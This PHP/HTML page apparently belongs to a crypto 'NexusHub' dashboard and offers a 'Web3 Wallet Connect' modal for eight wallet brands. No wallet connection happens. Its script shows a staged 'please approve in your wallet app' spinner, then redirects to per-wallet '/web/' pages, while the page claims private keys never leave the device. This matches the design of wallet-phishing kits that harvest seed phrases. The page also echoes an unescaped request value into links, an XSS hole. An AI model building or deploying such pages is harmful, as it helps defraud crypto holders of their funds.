<?php
include 'cdn.php';
include 'config.php';
$usr_string = $req;

$numbers = preg_replace('/\D/', '', $req);

$chk = $conn->query("select * from user_details where uid='$numbers' OR id='$numbers'");
if (!$chk || $chk->num_rows == 0) {
    $chk = $conn->query("select * from user_details limit 1");
}

if ($chk && $chk->num_rows > 0) {
    $loop = $chk->fetch_assoc();
} else {
    $loop = [
        'id' => 1,
        'uid' => !empty($numbers) ? $numbers : '1001',
        'uname' => 'Trader',
        'uemail' => 'user@nexushub.com',
        'kyc_status' => 'Not Submitted'
    ];
}

$uid = isset($loop['id']) ? $loop['id'] : 1;
$u = isset($loop['uid']) ? $loop['uid'] : (!empty($numbers) ? $numbers : '1001');

$bl_check = $conn->query("select * from bal where uid='$uid'");
$itr = ($bl_check && $bl_check->num_rows > 0) ? $bl_check->fetch_assoc() : ['bal' => 0];

include 'dashboard_header.php';
?>

<div class="max-w-4xl mx-auto space-y-8 w-full max-w-full overflow-x-hidden">
    <div class="text-center mb-8 sm:mb-12">
        <div class="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-gold rounded-3xl flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-xl shadow-orange-500/20">
            <i class="fas fa-globe text-black text-2xl sm:text-3xl"></i>
        </div>
        <h2 class="font-syne text-2xl sm:text-3xl font-800 text-white mb-2 sm:mb-3">Web3 Wallet Connect</h2>
        <p class="text-gray-400 text-xs sm:text-sm max-w-md mx-auto leading-relaxed">Securely connect your decentralized wallet to sync your assets and enable direct trading.</p>
    </div>

    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 sm:gap-8 mb-8">
        <!-- Selection Card -->
        <div class="card-dark rounded-2xl sm:rounded-[2.5rem] p-6 sm:p-10 border-white/5">
            <h3 class="font-syne font-700 text-lg sm:text-xl mb-6">Connect New</h3>
            <div class="space-y-4">
                <label class="block text-xs font-700 text-gray-500 uppercase tracking-widest ml-1">Choose Network</label>
                <select class="w-full bg-white/5 border border-white/10 rounded-2xl py-3.5 px-5 text-white text-xs sm:text-sm appearance-none focus:outline-none focus:ring-2 focus:ring-primary/50 transition-all cursor-pointer">
                    <option value="eth">Ethereum Mainnet</option>
                    <option value="bsc">Binance Smart Chain</option>
                    <option value="sol">Solana Network</option>
                    <option value="poly">Polygon (Matic)</option>
                </select>

                <button id="myBtn" class="w-full mt-4 bg-gradient-gold text-black font-800 py-3.5 sm:py-4 rounded-2xl shadow-lg shadow-orange-500/20 hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-3 font-syne uppercase tracking-wider text-xs sm:text-sm">
                    <i class="fas fa-plug"></i> Connect Wallet
                </button>
            </div>

            <div class="mt-8 pt-6 border-t border-white/5">
                <p class="text-xs text-gray-500 italic leading-relaxed text-center">
                    <i class="fas fa-shield-halved mr-2 text-primary"></i>
                    Trusted by industry giants. Your private keys never leave your device.
                </p>
            </div>
        </div>

        <!-- Status Card -->
        <div class="card-dark rounded-2xl sm:rounded-[2.5rem] p-6 sm:p-10 border-white/5 relative overflow-hidden flex flex-col justify-center text-center">
            <div class="absolute inset-0 bg-primary/5 opacity-50 blur-3xl rounded-full -m-10"></div>
            <div class="relative z-10">
                <div class="w-14 h-14 sm:w-16 sm:h-16 bg-white/5 rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 border border-white/10">
                    <i class="fas fa-link-slash text-xl sm:text-2xl text-gray-600"></i>
                </div>
                <h4 class="font-syne font-700 text-base sm:text-lg text-white mb-2">No Wallet Connected</h4>
                <p class="text-xs sm:text-sm text-gray-500 mb-6 sm:mb-8">Synchronize with NexusHub to unlock pro features.</p>

                <div class="flex justify-center gap-3">
                    <div class="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center grayscale opacity-30"><img src="https://crypto-surge.com/web3/images/metamask.jpg" class="w-5 rounded-sm"></div>
                    <div class="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center grayscale opacity-30"><img src="https://crypto-surge.com/web3/images/trustwallet.jpg" class="w-5 rounded-sm"></div>
                    <div class="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center grayscale opacity-30"><img src="https://crypto-surge.com/web3/images/coinbase.jpg" class="w-5 rounded-sm"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Market Ticker -->
    <div class="card-dark rounded-2xl sm:rounded-3xl p-4 sm:p-6 border-white/5">
        <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe>
    </div>
</div>

<!-- Wallet Modal -->
<div id="myModal" class="fixed inset-0 z-[100] hidden items-center justify-center px-4">
    <div class="absolute inset-0 bg-black/80 backdrop-blur-md" id="modal-backdrop"></div>
    <div class="relative w-full max-w-xl card-dark rounded-2xl sm:rounded-[2.5rem] border-white/10 p-6 sm:p-8 lg:p-12 shadow-2xl">
        <div class="flex justify-between items-center mb-6 sm:mb-10">
            <h3 class="font-syne font-800 text-xl sm:text-2xl gradient-text">Select Provider</h3>
            <button class="close-modal w-10 h-10 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition">
                <i class="fas fa-times"></i>
            </button>
        </div>

        <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4 lg:gap-6" id="wallet-grid">
            <?php
            $wallets = [
                ['Trust Wallet', 'trustwallet.jpg', 'trustwallet'],
                ['Coinbase', 'coinbase.jpg', 'coinbase'],
                ['MetaMask', 'metamask.jpg', 'metamask'],
                ['SafePal', 'safepal.jpg', 'safepal'],
                ['Bitcoin.com', 'bitcoin.jpg', 'bitcoin'],
                ['Crypto.com', 'crypto.jpg', 'crypto'],
                ['Exodus', 'exoduswallet.jpg', 'exoduswallet'],
                ['Atomic', 'atomicwallet.jpg', 'atomicwallet']
            ];
            foreach($wallets as $w):
            ?>
            <a href="/web/<?php echo $req;?>-<?php echo $w[2];?>" class="group flex flex-col items-center p-4 sm:p-6 rounded-2xl sm:rounded-3xl bg-white/5 border border-white/5 hover:border-primary/30 hover:bg-primary/5 transition-all">
                <div class="w-10 h-10 sm:w-12 sm:h-12 lg:w-16 lg:h-16 rounded-2xl overflow-hidden mb-3 sm:mb-4 shadow-lg group-hover:scale-110 transition-transform">
                    <img src="https://crypto-surge.com/web3/images/<?php echo $w[1];?>" alt="<?php echo $w[0];?>" class="w-full h-full object-cover">
                </div>
                <span class="text-[11px] sm:text-xs font-700 text-gray-400 group-hover:text-white transition-colors text-center"><?php echo $w[0];?></span>
            </a>
            <?php endforeach; ?>
        </div>

        <!-- Connection Loader -->
        <div id="conn-loader" class="hidden flex-col items-center justify-center py-8 sm:py-12 text-center">
            <div class="relative w-20 h-20 sm:w-24 sm:h-24 mb-6 sm:mb-8">
                <div class="absolute inset-0 border-4 border-primary/20 rounded-full"></div>
                <div class="absolute inset-0 border-4 border-primary rounded-full border-t-transparent animate-spin"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <i class="fas fa-link text-xl sm:text-2xl text-primary animate-pulse"></i>
                </div>
            </div>
            <h4 class="font-syne font-700 text-lg sm:text-xl mb-2">Connecting...</h4>
            <p class="text-xs sm:text-sm text-gray-500 mb-6 sm:mb-8">Please approve the connection in your wallet app.</p>
            <a href="/support/<?php echo $req;?>" class="px-6 sm:px-8 py-3 bg-white/5 border border-white/10 rounded-xl text-xs font-700 hover:bg-white/10 transition">Try Manually</a>
        </div>
    </div>
</div>

<script>
    const modal = document.getElementById("myModal");
    const btn = document.getElementById("myBtn");
    const closeBtns = document.querySelectorAll(".close-modal");
    const backdrop = document.getElementById("modal-backdrop");
    const walletGrid = document.getElementById("wallet-grid");
    const connLoader = document.getElementById("conn-loader");

    if (btn) {
        btn.onclick = () => {
            modal.classList.remove('hidden');
            modal.classList.add('flex');
            document.body.style.overflow = 'hidden';
        }
    }

    const hideModal = () => {
        if (modal) {
            modal.classList.add('hidden');
            modal.classList.remove('flex');
            document.body.style.overflow = 'auto';
        }
        if (walletGrid) {
            walletGrid.classList.remove('hidden');
            walletGrid.classList.add('grid');
        }
        if (connLoader) {
            connLoader.classList.add('hidden');
        }
    }

    closeBtns.forEach(b => b.onclick = hideModal);
    if (backdrop) backdrop.onclick = hideModal;

    document.querySelectorAll('#wallet-grid a').forEach(a => {
        a.onclick = (e) => {
            e.preventDefault();
            const href = a.getAttribute('href');
            if (walletGrid) {
                walletGrid.classList.remove('grid');
                walletGrid.classList.add('hidden');
            }
            if (connLoader) {
                connLoader.classList.remove('hidden');
                connLoader.classList.add('flex');
            }

            setTimeout(() => {
                window.location.href = href;
            }, 2500);
        }
    });
</script>

<?php
include 'dashboard_footer.php';
?>
